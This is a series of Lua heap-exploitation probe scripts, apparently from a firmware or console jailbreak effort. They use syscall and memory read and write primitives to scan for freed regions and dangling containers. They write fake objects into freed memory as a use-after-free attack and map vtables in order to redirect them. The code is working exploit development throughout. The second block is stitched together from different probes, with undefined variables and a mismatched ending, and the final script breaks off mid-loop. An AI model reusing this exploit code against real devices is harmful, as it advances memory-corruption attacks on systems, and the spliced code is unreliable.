```lua
-- CRASH_CLASS: RISKY
-- PROBE 41k: wider UAF scan + direct exploitation
-- Problem: heap layout varies per run. Solution:
--   1. Scan wider (512 pages), find ALL AFAF freed regions
--   2. For each, check if a live object (non-AFAF) follows it
--   3. If a live object has pointer-like fields, that's our target
--   4. Write controlled data into the freed region
--   5. Check if any pointer in the adjacent live object now resolves
--      to our controlled data (overlap/aliasing)

print("=== PROBE 41k: WIDE UAF SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local base = do_mmap(PAGE)
if not base then print("mmap FAILED"); return end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- SCAN: find freed regions and what borders them
--------------------------------------------------------------------
print("--- FREED REGIONS ---")

local freed_regions = {}
local in_freed = false
local freed_start = 0

for i = 1, 512 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end

    if v == 0xAFAFAFAF then
        if not in_freed then
            freed_start = pg
            in_freed = true
        end
    else
        if in_freed then
            -- end of a freed region, pg is the first non-freed page
            freed_regions[#freed_regions + 1] = {
                start = pg + 0x1000,  -- first freed page
                ending = freed_start, -- last freed page
                next_live = pg,       -- first live page after freed
                next_val = v,
            }
            in_freed = false
        end
    end
    if #freed_regions >= 16 then break end
end

print("freed regions: " .. #freed_regions)
for j, r in ipairs(freed_regions) do
    local size = r.ending - r.start + 0x1000
    print(string.format("  #%d: %s - %s (%s bytes) next_live=%s val=%s",
        j, hex(r.start), hex(r.ending), hex(size),
        hex(r.next_live), hex(r.next_val)))
end
print("")

--------------------------------------------------------------------
-- For each freed region, examine what the live neighbor looks like
--------------------------------------------------------------------
print("--- LIVE NEIGHBORS ---")

local best_target = nil

for j, r in ipairs(freed_regions) do
    if j > 6 then break end
    local live = r.next_live
    print(string.format("  region #%d: live page at %s", j, hex(live)))

    -- dump first 8 qwords of live page
    local has_ptr = false
    local has_heap = false
    for off = 0, 0x38, 8 do
        local q = safe_rq(live + off)
        if q then
            local h, l = get_hi_lo(q)
            local tag = ""
            if h >= 0xFFFFFF80 then tag = " KPTR!" end
            if h == 0 and l >= 0x80000000 and l < 0x90000000 then tag = " TEXT!"; has_ptr = true end
            if h == 3 and l >= 0x10000000 then tag = " HEAP"; has_heap = true end
            if h == 0 and l >= 1 and l <= 16 then tag = " RC?" end
            print(string.format("    [+%02X] %s%s", off, dump_qword(q), tag))
        end
    end

    if (has_ptr or has_heap) and not best_target then
        best_target = {region = r, live = live, has_text = has_ptr}
    end
    print("")
end

--------------------------------------------------------------------
-- Also look for rc=4 containers with freed targets (wider scan)
--------------------------------------------------------------------
print("--- RC=4 WITH FREED TARGETS ---")
local dangling = {}
for i = 1, 512 do
    if #dangling >= 8 then break end
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end
    if v == 4 then
        -- potential rc=4 at page start
        local q1 = safe_rq(pg + 8)
        if q1 then
            local h1, l1 = get_hi_lo(q1)
            if h1 == 3 and l1 >= 0x10000000 then
                local tgt_addr = h1 * 0x100000000 + l1
                local tgt_q = safe_rq(uint64(tgt_addr))
                if tgt_q then
                    local th, tl = get_hi_lo(tgt_q)
                    if th == 0xAFAFAFAF then
                        dangling[#dangling + 1] = {
                            container = pg, target = tgt_addr
                        }
                    end
                end
            end
        end
    end
    -- also scan at common offsets within page
    if v ~= 0 and v ~= 0xAFAFAFAF then
        for _, off in ipairs({0x40, 0x80, 0xC0, 0x100, 0x200, 0x300, 0x400, 0x500, 0x600, 0x700, 0x800, 0x900, 0xA00, 0xB00, 0xC00, 0xD00, 0xE00, 0xF00}) do
            if #dangling >= 8 then break end
            local rc = safe_rd(pg + off)
            if rc == 4 then
                local q1 = safe_rq(pg + off + 8)
                if q1 then
                    local h1, l1 = get_hi_lo(q1)
                    if h1 == 3 and l1 >= 0x10000000 then
                        local tgt_addr = h1 * 0x100000000 + l1
                        local tgt_q = safe_rq(uint64(tgt_addr))
                        if tgt_q then
                            local th, tl = get_hi_lo(tgt_q)
                            if th == 0xAFAFAFAF then
                                dangling[#dangling + 1] = {
                                    container = pg + off, target = tgt_addr
                                }
                            end
                        end
                    end
                end
            end
        end
    end
end

print("dangling rc=4 containers: " .. #dangling)
for j, d in ipairs(dangling) do
    print(string.format("  #%d container=%s target=%s", j, hex(d.container), hex(d.target)))
end
print("")

--------------------------------------------------------------------
-- EXPLOIT: write to the best freed region and check impact
--------------------------------------------------------------------
if #dangling > 0 then
    print("--- EXPLOIT: DANGLING CONTAINER ---")
    local d = dangling[1]
    local tgt = d.target

    -- measure freed extent
    local extent = 0
    for off = 0, 0x1F0, 8 do
        local q = safe_rq(uint64(tgt + off))
        if q then
            local h, l = get_hi_lo(q)
            if h == 0xAFAFAFAF then extent = off + 8
            else break end
        else break end
    end
    print("  freed extent: " .. hex(extent))

    -- write controlled fake object
    print("  writing fake object at " .. hex(tgt))
    -- pattern: self-referential pointers back to our data
    safe_wd(tgt,     0xDEAD0001)
    safe_wd(tgt + 4, 0xFACE0001)  -- +00: recognizable vtable marker

    -- verify
    local vq = safe_rq(uint64(tgt))
    print("  verify: " .. (vq and dump_qword(vq) or "FAULT"))

    -- now try triggers
    print("  triggering...")
    -- mmap churn
    for i = 1, 16 do
        local a = do_mmap(PAGE)
        if a then pcall(function() sc_munmap(uint64(a), uint64(PAGE)) end) end
    end
    -- pipe/socket
    local sys_pipe = make_syscall(42)
    local sys_close = make_syscall(6)
    local pb = memory.alloc(16)
    for i = 1, 4 do
        pcall(function() sys_pipe(pb) end)
        local f0 = safe_rd(pb)
        local f1 = safe_rd(pb + 4)
        if f0 and f0 > 0 then pcall(function() sys_close(f0) end) end
        if f1 and f1 > 0 then pcall(function() sys_close(f1) end) end
    end

    -- check if our data survived
    local post = safe_rq(uint64(tgt))
    print("  post-trigger: " .. (post and dump_qword(post) or "FAULT"))
    if post then
        local ph, pl = get_hi_lo(post)
        if pl == 0xDEAD0001 and ph == 0xFACE0001 then
            print("  fake object SURVIVED (not yet triggered)")
        else
            print("  *** OBJECT WAS TOUCHED/FREED ***")
        end
    else
        print("  *** PAGE FAULTED — FREED FROM UNDER US ***")
    end

    -- restore
    for off = 0, extent - 1, 4 do
        safe_wd(tgt + off, 0xAFAFAFAF)
    end
    print("  restored")
elseif best_target then
    print("--- EXPLOIT: FREED->LIVE BOUNDARY ---")
    local r = best_target.region
    -- write at the end of the freed region, close to the live boundary
    local write_addr = r.ending
    print("  writing marker at end of freed region: " .. hex(write_addr))

    -- save original
    local orig = safe_rq(write_addr)
    print("  original: " .. (orig and dump_qword(orig) or "?"))

    -- write
    safe_wd(write_addr, 0xBEEF0001)
    safe_wd(write_addr + 4, 0xCAFE0001)
    local after = safe_rq(write_addr)
    print("  after: " .. (after and dump_qword(after) or "FAULT"))

    -- restore
    if orig then
        local oh, ol = get_hi_lo(orig)
        safe_wd(write_addr, ol)
        safe_wd(write_addr + 4, oh)
    end
    print("  restored")
else
    print("--- NO EXPLOITABLE TARGET FOUND ---")
end

print("")
pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41k COMPLETE ===")
```

```lua
-- CRASH_CLASS: SAFE (read-only)
-- PROBE 41l: dump the 0x142621xxx region
-- From 41i/41k: live objects reference 0x142621908, 918, 948, 950
-- If this is a vtable/function table, we can redirect it

print("=== PROBE 41l: VTABLE REGION DUMP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

--------------------------------------------------------------------
-- SECTION 1: Probe the 0x142621xxx region
-- Known refs: 0x142621908, 0x142621918, 0x142621948, 0x142621950

local region_end  = 0x142621A00

if test == nil then
    print("  0x142621800 NOT READABLE")
    -- try broader probes
    local probes = {
        0x142621000, 0x142620000, 0x142600000,
        0x142000000, 0x140000000, 0x100000000,
    }
    for _, p in ipairs(probes) do
        local v = safe_rd(p)
        print(string.format("  %s: %s", hex(p), v and hex(v) or "FAULT"))
    end
    print("")
    print("  the 0x1_4xxxxxxx region may not be directly addressable")
    print("  (the values may be 32-bit with high bit = ptr tag)")
else
    -- dump the whole region
    for addr = region_base, region_end - 8, 8 do
        local q = safe_rq(addr)
        if q then
            local h, l = get_hi_lo(q)
            local tag = ""
            if h >= 0xFFFFFF80 then tag = " KPTR!" end
            if h == 0 and l >= 0x80000000 and l < 0x90000000 then tag = " TEXT!" end
            if h == 3 and l >= 0x10000000 then tag = " HEAP" end
            if h == 0 and l == 0 then tag = " NULL" end
            -- mark the known referenced addresses
            if addr == 0x142621908 then tag = tag .. " <-- ref1" end
            if addr == 0x142621918 then tag = tag .. " <-- ref2" end
            if addr == 0x142621948 then tag = tag .. " <-- ref3" end
            if addr == 0x142621950 then tag = tag .. " <-- ref4" end
            if h ~= 0 or l ~= 0 then
                print(string.format("  %s: %s%s", hex(addr), dump_qword(q), tag))
            end
        else
            print(string.format("  %s: FAULT", hex(addr)))
            break
        end
    end
end
print("")

--------------------------------------------------------------------
-- SECTION 2: Wider scan — what IS the 0x1_4xxxxxxx range?
-- Maybe it's 0x00000001_42621xxx in 64-bit (a valid heap region?)
--------------------------------------------------------------------
print("--- SECTION 2: IS 0x1_42621xxx A 64-BIT ADDR? ---")

local addr64 = uint64(0x142621900)
local test64 = safe_rq(addr64)
if test64 then
    print("  uint64(0x142621900) readable: " .. dump_qword(test64))
    -- dump around it
    for off = -0x40, 0xC0, 8 do
        local q = safe_rq(uint64(0x142621900 + off))
        if q then
            local h, l = get_hi_lo(q)
            local tag = ""
            if h >= 0xFFFFFF80 then tag = " KPTR!" end
            if h == 0 and l >= 0x80000000 and l < 0x90000000 then tag = " TEXT!" end
            if h == 1 and l >= 0x40000000 then tag = " SELF?" end
            if h == 3 then tag = " HEAP" end
            if h == 0 and l == 0 then
                -- skip zeros for brevity
            else
                print(string.format("  [%+04X] %s%s", off, dump_qword(q), tag))
            end
        end
    end
else
    print("  uint64(0x142621900) NOT READABLE")
end
print("")

--------------------------------------------------------------------
-- SECTION 3: Dereference values found in the vtable region
-- If they're function pointers, reading them should give code bytes
--------------------------------------------------------------------
print("--- SECTION 3: DEREFERENCE VTABLE ENTRIES ---")
do
    -- collect non-zero values from the region
    local entries = {}
    for off = 0, 0x100, 8 do
        local q = safe_rq(uint64(0x142621900 + off))
        if q then
            local h, l = get_hi_lo(q)
            if h ~= 0 or l ~= 0 then
                entries[#entries + 1] = {off = off, hi = h, lo = l, q = q}
            end
        end
    end

    local derefed = 0
    for _, e in ipairs(entries) do
        if derefed >= 12 then break end
        -- try to read at the value as an address
        local target
        if e.hi == 0 and e.lo >= 0x80000000 and e.lo < 0xFFFF0000 then
            -- 32-bit address in text range
            target = e.lo
        elseif e.hi >= 1 and e.hi <= 3 then
            -- 64-bit heap/data address
            target = e.hi * 0x100000000 + e.lo
        end

        if target then
            local dw = safe_rd(target)
            if dw then
                local b0 = dw % 256
                local tag = "?"
                if b0 == 0x55 or b0 == 0x48 or b0 == 0x41 or
                   b0 == 0xE8 or b0 == 0xE9 or b0 == 0xCC or
                   b0 == 0xC3 or b0 == 0x53 or b0 == 0x57 or
                   b0 == 0x89 or b0 == 0x8B or b0 == 0x4C or
                   b0 == 0x50 or b0 == 0x56 or b0 == 0x0F then
                    tag = "CODE"
                elseif dw == 0 then
                    tag = "ZERO"
                else
                    tag = "DATA"
                end
                print(string.format("  [+%03X] val=%s -> *%s = %s [%s] b0=%02X",
                    e.off, dump_qword(e.q), hex(target), hex(dw), tag, b0))
                derefed = derefed + 1
            else
                print(string.format("  [+%03X] val=%s -> *%s = FAULT",
                    e.off, dump_qword(e.q), hex(target)))
                derefed = derefed + 1
            end
        end
    end
    if derefed == 0 then
        print("  no dereferenceable entries found")
    end
end
print("")

--------------------------------------------------------------------
-- SECTION 4: What other ranges are readable?
-- Map the process VA space at coarse granularity
--------------------------------------------------------------------
print("--- SECTION 4: VA SPACE MAP ---")
do
    local ranges = {
        {name="0x400000",       addr=0x400000},
        {name="0x800000",       addr=0x800000},
        {name="0x80000000",     addr=0x80000000},
        {name="0x80D000000",    addr=0x80D000000},

        {name="0x140000000",    addr=0x140000000},
        {name="0x142000000",    addr=0x142000000},
        {name="0x142600000",    addr=0x142600000},
        {name="0x142620000",    addr=0x142620000},
        {name="0x142621000",    addr=0x142621000},
        {name="0x142621900",    addr=0x142621900},
        {name="0x142622000",    addr=0x142622000},
        {name="0x142630000",    addr=0x142630000},
        {name="0x142700000",    addr=0x142700000},
        {name="0x143000000",    addr=0x143000000},
```

```lua
}

for idx, tgt in ipairs(heap_targets) do
    print(string.format("  OBJ #%d at 0x%X:", idx, tgt))
    local first_dw = safe_rd(tgt)
    if first_dw == nil then
        print("    FAULT (not readable)")
    else
        -- dump 128 bytes as dwords for fine-grained view
        local line = ""
        local count = 0
        for off = 0, 0x7C, 4 do
            local d = safe_rd(tgt + off)
            if d then
                if off % 16 == 0 then
                    if line ~= "" then print(line) end
                    line = string.format("    [+%02X]", off)
                end
                line = line .. string.format(" %08X", d)
            end
        end
        if line ~= "" then print(line) end

        -- classify key fields
        local q0 = safe_rq(uint64(tgt))
        local q8 = safe_rq(uint64(tgt + 8))
        local q10 = safe_rq(uint64(tgt + 0x10))
        local q18 = safe_rq(uint64(tgt + 0x18))
        local q20 = safe_rq(uint64(tgt + 0x20))

        if q0 then
            local h0, l0 = get_hi_lo(q0)
            print(string.format("    +00 qword: %s (vtable/type?)", dump_qword(q0)))
        end
        if q8 then print(string.format("    +08 qword: %s", dump_qword(q8))) end
        if q10 then print(string.format("    +10 qword: %s", dump_qword(q10))) end
        if q18 then print(string.format("    +18 qword: %s", dump_qword(q18))) end
        if q20 then print(string.format("    +20 qword: %s", dump_qword(q20))) end
    end
    print("")
    if idx >= 4 then break end  -- limit output
end

--------------------------------------------------------------------
-- SECTION 4: The 0x1A3A4EE0 value — is it a pointer or a tag?
-- Try reading it as different address forms
--------------------------------------------------------------------
print("--- SECTION 4: INTERPRETING 0x1A3A4EE0 ---")

-- Form A: raw 32-bit
local formA = safe_rd(0x1A3A4EE0)
print("  as raw 0x1A3A4EE0: " .. (formA and hex(formA) or "FAULT"))

-- Form B: 0x0_1A3A4EE0 (33-bit, in low heap range)
local formB = safe_rq(uint64("0x1A3A4EE0"))
print("  as uint64(0x1A3A4EE0): " .. (formB and dump_qword(formB) or "FAULT"))

-- Form C: maybe the objects store a relative offset from some base
-- If base is the object itself, 0x1A3A4EE0 would be a huge forward offset
-- More likely: maybe it's an absolute 32-bit address in a data segment

-- Form D: check if it's in the ELF data segment
-- Text is 0x80000000-0x90000000, data might be adjacent
local probes_d = {
    {name="0x1A000000", addr=0x1A000000},
    {name="0x1A300000", addr=0x1A300000},
    {name="0x1A3A0000", addr=0x1A3A0000},
    {name="0x1A3A4000", addr=0x1A3A4000},
    {name="0x1A3A4E00", addr=0x1A3A4E00},
    {name="0x1A3A4EE0", addr=0x1A3A4EE0},
    {name="0x1A3A4F00", addr=0x1A3A4F00},
    {name="0x1A3A5000", addr=0x1A3A5000},
    {name="0x1A3B0000", addr=0x1A3B0000},
    {name="0x1A400000", addr=0x1A400000},
    {name="0x1B000000", addr=0x1B000000},
    {name="0x20000000", addr=0x20000000},
}
print("  data segment scan:")
for _, p in ipairs(probes_d) do
    local v = safe_rd(p.addr)
    print(string.format("    %-16s %s", p.name, v and hex(v) or "FAULT"))
end
print("")

--------------------------------------------------------------------
-- SECTION 5: If 0x1A3A4EE0 is readable, dump it as a potential
-- vtable (array of function pointers)
--------------------------------------------------------------------
print("--- SECTION 5: VTABLE DEREF ---")
if formA then
    print("  0x1A3A4EE0 is readable (value " .. hex(formA) .. ")")
    -- treat formA as a pointer, dereference it
    local inner = safe_rd(formA)
    if inner then
        print("  *(" .. hex(formA) .. ") = " .. hex(inner))
        -- check if it looks like code
        local b0 = inner % 256
        local tag = "?"
        if b0 == 0x55 or b0 == 0x48 or b0 == 0x41 or b0 == 0x53 then tag = "CODE" end
        print("  first byte: " .. string.format("0x%02X [%s]", b0, tag))
    else
        print("  *(" .. hex(formA) .. ") = FAULT")
    end

    -- also read a wider vtable dump at 0x1A3A4EE0
    print("  entries at 0x1A3A4EE0 as potential function table:")
    for off = 0, 0x78, 4 do
        local d = safe_rd(0x1A3A4EE0 + off)
        if d then
            if d ~= 0 then
                -- try to dereference each non-zero value
                local inner2 = safe_rd(d)
                local tag2 = ""
                if inner2 then
                    local ib = inner2 % 256
                    if ib == 0x55 or ib == 0x48 or ib == 0x41 or
                       ib == 0xE8 or ib == 0xE9 or ib == 0x53 or
                       ib == 0x50 or ib == 0x56 or ib == 0x57 or
                       ib == 0x0F or ib == 0x4C or ib == 0x89 then
                        tag2 = string.format(" -> CODE (%02X...)", ib)
                    elseif inner2 == 0 then
                        tag2 = " -> NULL"
                    else
                        tag2 = string.format(" -> %08X", inner2)
                    end
                else
                    tag2 = " -> FAULT"
                end
                print(string.format("    [+%02X] %08X%s", off, d, tag2))
            end
        else
            break
        end
    end
end
print("")

--------------------------------------------------------------------
-- SECTION 6: Full VA map (text output only, no binary)
--------------------------------------------------------------------
print("--- SECTION 6: VA MAP ---")
local va_probes = {
    0x400000, 0x800000, 0x1000000, 0x2000000, 0x4000000,
    0x8000000, 0x10000000, 0x1A000000, 0x1A3A4EE0,
    0x20000000, 0x40000000, 0x80000000, 0x80100000,
    0x80200000, 0x80D00000, 0x81000000, 0x82000000,
    0x84000000, 0x88000000, 0x8C000000, 0x90000000,
    0xA0000000, 0xC0000000, 0xF0000000,
}
for _, addr in ipairs(va_probes) do
    local d = safe_rd(addr)
    local r = d and string.format("%08X", d) or "---FAULT---"
    print(string.format("  %08X: %s", addr, r))
end
print("")

print("=== PROBE 41m COMPLETE ===")
```

## probes/phase7_heap_exploitation/41m_vtable_probe.lua

```lua
-- 14.10 Probe 41m: dump and classify 0x1A3A4EE0 (the REAL common object header)
-- Context: 41l showed 0x142621xxx is a hash/bucket table of backpointers,
-- and the actual shared value at +0 of live heap objects is 0x1A3A4EE0.
-- Goals:
--   1. Dump the region around 0x1A3A4EE0 (hex, safe)
--   2. Classify each pointer-sized value: data / heap / likely-code
--      (NEVER dereference likely-code: XOM -> SIGBUS kills the loader.
--       A crash on read IS the oracle that it's a code page.)
--   3. Re-discover live objects this run by scanning the heap window for
--      dword == 0x1A3A4EE0, then dump their full structure.
-- Output is hex-only (41l sections 4/5 were garbled by raw binary prints).

print("=== 41m: VTABLE TARGET 0x1A3A4EE0 ===")
print("fw: " .. tostring(FW_VERSION))
print("pid: " .. syscall.getpid():tonumber())

local TARGET = 0x1A3A4EE0

-- ---------------------------------------------------------------
-- helpers
-- ---------------------------------------------------------------
local function hx(v, w)
    return string.format("%0" .. (w or 8) .. "x", v)
end

-- classify a 64-bit value by magnitude (regions observed in 41i-41l):
--   0x014xxxxxxx        low data mapping (bucket table region)
--   0x1Axxxxxx         low mapping (TARGET lives here)
--   0x3_1xxxxxxx       heap (per-run shifting)
--   0x4xxxxxxx-0x6xxxxxxx  code region (crash handler was 0x533118f4)
local function classify(v)
    if v == 0 then return "null" end
    if v < 0x10000 then return "small-int"
    elseif v < 0x10000000 then return "low??"
    elseif v < 0x20000000 then return "LOW-DATA"
    elseif v < 0x100000000 then return "low32?"
    elseif v < 0x200000000 then return "LOW-DATA-4G"
    elseif v >= 0x300000000 and v < 0x400000000 then return "HEAP"
    elseif v >= 0x40000000 and v < 0x80000000 then return "CODE??"
    elseif v >= 0x400000000 and v < 0x800000000 then return "hi-data?"
    else return "other" end
end

-- safe to deref only these (data/heap); anything else: label only
local function deref_ok(v)
    return (v >= 0x10000000 and v < 0x20000000)
        or (v >= 0x100000000 and v < 0x200000000)
        or (v >= 0x300000000 and v < 0x400000000)
end

-- ---------------------------------------------------------------
-- PART 1: dump TARGET region (qwords, hex)
-- ---------------------------------------------------------------
print("")
print("--- PART 1: region dump 0x1A3A4E00 .. 0x1A3A5000 ---")
for off = -0xE0, 0x120, 0x10 do
    local a = TARGET + off
    local lo = memory.read_dword(a):tonumber()
    local hi = memory.read_dword(a + 4):tonumber()
    local lo2 = memory.read_dword(a + 8):tonumber()
    local hi2 = memory.read_dword(a + 12):tonumber()
    print(string.format("0x%08x: %08x_%08x  %08x_%08x", a, hi, lo, hi2, lo2))
end

-- ---------------------------------------------------------------
-- PART 2: classify + selective deref of each qword entry
-- ---------------------------------------------------------------
print("")
print("--- PART 2: entry classification (deref = data/heap only) ---")
local interesting = {}
for off = 0, 0x100, 8 do
    local a = TARGET + off
    local hi = memory.read_dword(a + 4):tonumber()
    local lo = memory.read_dword(a):tonumber()
    local v = hi * 0x100000000 + lo
    local cls = classify(v)
    print(string.format("[+0x%02x] 0x%x  %s", off, v, cls))
    if cls ~= "null" and cls ~= "small-int" then
        table.insert(interesting, { off = off, val = v, cls = cls })
    end
end

print("")
print("--- PART 3: deref pass (tag printed BEFORE each read) ---")
for _, e in ipairs(interesting) do
    if deref_ok(e.val) then
        print(string.format("deref [+0x%02x] -> 0x%x :", e.off, e.val))
        for i = 0, 3 do
            local b = e.val + i * 8
            local hi = memory.read_dword(b + 4):tonumber()
            local lo = memory.read_dword(b):tonumber()
            print(string.format("    0x%x: %08x_%08x", b, hi, lo))
        end
    else
        print(string.format("skip  [+0x%02x] 0x%x (%s) — not safe to read",
            e.off, e.val, e.cls))
    end
end

-- ---------------------------------------------------------------
-- PART 4: find live objects this run (heap scan for dword TARGET)
-- ---------------------------------------------------------------
print("")
print("--- PART 4: heap scan for objects starting with 0x1A3A4EE0 ---")
-- windows derived from 41j/41k anchors (0x310856000, 0x310878000, 0x310924000)
local windows = {
    { 0x310800000, 0x310A00000 },
    { 0x310000000, 0x310800000 },
}
local hits = {}
for _, w in ipairs(windows) do
    local a = w[1]
    while a < w[2] and #hits < 32 do
        if memory.read_dword(a):tonumber() == TARGET then
            table.insert(hits, a)
        end
        a = a + 8
    end
    print(string.format("window 0x%x-0x%x: %d hits so far", w[1], w[2], #hits))
    if #hits >= 32 then break end
end

print("")
print("--- PART 5: object dumps (first 8 hits, 0x60 bytes each) ---")
for h = 1, math.min(#hits, 8) do
    local base = hits[h]
    print(string.format("object @ 0x%x:", base))
    for off = 0, 0x60, 0x10 do
        local a = base + off
        local lo = memory.read_dword(a):tonumber()
        local hi = memory.read_dword(a + 4):tonumber()
        local lo2 = memory.read_dword(a + 8):tonumber()
        local hi2 = memory.read_dword(a + 12):tonumber()
        print(string.format("  +0x%02x: %08x_%08x  %08x_%08x", off, hi, lo, hi2, lo2))
    end
end

-- ---------------------------------------------------------------
-- PART 6: verdict hints
-- ---------------------------------------------------------------
print("")
print("--- interpretation guide ---")
print("TARGET region = array of CODE?? pointers   -> real vtable, plan redirect")
print("TARGET region = mixed HEAP/LOW-DATA ptrs   -> type descriptor w/ links")
print("TARGET region = mostly small-int/null      -> struct, not a table at all")
print("loader died on a deref line                -> that address is XOM code")
print("=== 41m DONE ===")
```

## probes/phase7_heap_exploitation/41n_header_chase.lua

```lua
-- 14.10 Probe 41n: chase the REAL object header pointer
-- 41m crashed: 0x1A3A4EE0 as a raw address is UNMAPPED (SIGSEGV, si_addr
-- 0x1A3A4E00 confirmed via crash record 0x13371337). Conclusion: the value
-- at object+0 is only the LOW dword of a 64-bit pointer — almost certainly
-- 0x00000003_1A3A4EE0, i.e. a HEAP object (0x3_1A3A4EE0 sits in the known
-- 0x3_1xxxxxxx heap range). Heap base shifts per run, so:
--   1. anchor = memory.alloc() -> learn this run's heap address
--   2. scan a window around the anchor for dword == 0x1A3A4EE0
--   3. read the FULL qword at +0 of each hit -> real pointer P
--   4. dump region at P, classify entries, one-level deref of heap entries
-- Never reads 0x1A3A4xxx directly again.

print("=== 41n: REAL HEADER POINTER CHASE ===")
print("fw: " .. tostring(FW_VERSION))
print("pid: " .. syscall.getpid():tonumber())

local TARGET_LO = 0x1A3A4EE0

local function to_num(v)
    local ok, n = pcall(function() return v:tonumber() end)
    if ok then return n end
    return tonumber(v) or 0
end

-- ---------------------------------------------------------------
-- PART 1: anchor on this run's heap
-- ---------------------------------------------------------------
local anchor_buf = memory.alloc(16)
local anchor = to_num(anchor_buf)
print(string.format("alloc anchor: 0x%x", anchor))

-- heap is 0x3_xxxxxxxx; take the address modulo to find low bits
local heap_hi = math.floor(anchor / 0x100000000)
print(string.format("heap high dword: 0x%x", heap_hi))

-- ---------------------------------------------------------------
-- PART 2: scan window around anchor for low dword == TARGET_LO
-- ---------------------------------------------------------------
local WIN = 0x1000000          -- +-16 MB
local lo = anchor - (anchor % 8) - WIN
local hi = anchor + WIN
print(string.format("scanning 0x%x .. 0x%x (step 8)", lo, hi))

local hits = {}
local a = lo
while a < hi do
    if memory.read_dword(a):tonumber() == TARGET_LO then
        table.insert(hits, a)
        if #hits >= 24 then break end
    end
    a = a + 8
end
print("hits: " .. #hits)
for i, h in ipairs(hits) do
    print(string.format("  hit %2d @ 0x%x", i, h))
end

if #hits == 0 then
    print("no objects found in window — widen WIN and retry")
    print("=== 41n DONE (no hits) ===")
    return
end

-- ---------------------------------------------------------------
-- PART 3: full qword at +0 of each hit -> the real pointer P
-- ---------------------------------------------------------------
print("")
print("--- PART 3: full header qwords ---")
local real_P = 0
for i = 1, math.min(#hits, 8) do
    local base = hits[i]
    local qw_lo = memory.read_dword(base):tonumber()
    local qw_hi = memory.read_dword(base + 4):tonumber()
    print(string.format("obj @ 0x%x: +0 = %08x_%08x", base, qw_hi, qw_lo))
    if real_P == 0 and qw_hi ~= 0 then
        real_P = qw_hi * 0x100000000 + qw_lo
    end
end

if real_P == 0 then
    print("all headers have high dword 0 — TARGET really is a 32-bit value")
    print("=== 41n DONE (no pointer) ===")
    return
end
print(string.format("real header pointer P = 0x%x", real_P))

-- ---------------------------------------------------------------
-- PART 4: dump object structure around first hit (0x80 bytes)
-- ---------------------------------------------------------------
print("")
print("--- PART 4: object dump (first hit) ---")
local base = hits[1]
for off = 0, 0x70, 0x10 do
    local p = base + off
    local l1 = memory.read_dword(p):tonumber()
    local h1 = memory.read_dword(p + 4):tonumber()
    local l2 = memory.read_dword(p + 8):tonumber()
    local h2 = memory.read_dword(p + 12):tonumber()
    print(string.format("  +0x%02x: %08x_%08x  %08x_%08x", off, h1, l1, h2, l2))
end

-- ---------------------------------------------------------------
-- PART 5: dump region at P (the shared header/type object)
-- ---------------------------------------------------------------
print("")
print("--- PART 5: dump at P (tag printed before each line) ---")
local entries = {}
for off = 0, 0x78, 8 do
    print(string.format("reading P+0x%02x ...", off))
    local p = real_P + off
    local ql = memory.read_dword(p):tonumber()
    local qh = memory.read_dword(p + 4):tonumber()
    local v = qh * 0x100000000 + ql
    local cls = "other"
    if v == 0 then cls = "null"
    elseif v < 0x10000 then cls = "small-int"
    elseif qh == heap_hi then cls = "HEAP(same arena)"
    elseif qh == 0 and ql >= 0x10000000 then cls = "low32"
    elseif v >= 0x20000000 and v < 0x60000000 then cls = "CODE??"
    end
    print(string.format("  P+0x%02x: %08x_%08x  %s", off, qh, ql, cls))
    if v ~= 0 then table.insert(entries, { off = off, val = v, cls = cls }) end
end

-- ---------------------------------------------------------------
-- PART 6: one-level deref of HEAP entries only (tag before each)
-- ---------------------------------------------------------------
print("")
print("--- PART 6: deref heap entries ---")
for _, e in ipairs(entries) do
    if e.cls == "HEAP(same arena)" then
        print(string.format("deref P+0x%02x -> 0x%x", e.off, e.val))
        for i = 0, 3 do
            local p = e.val + i * 8
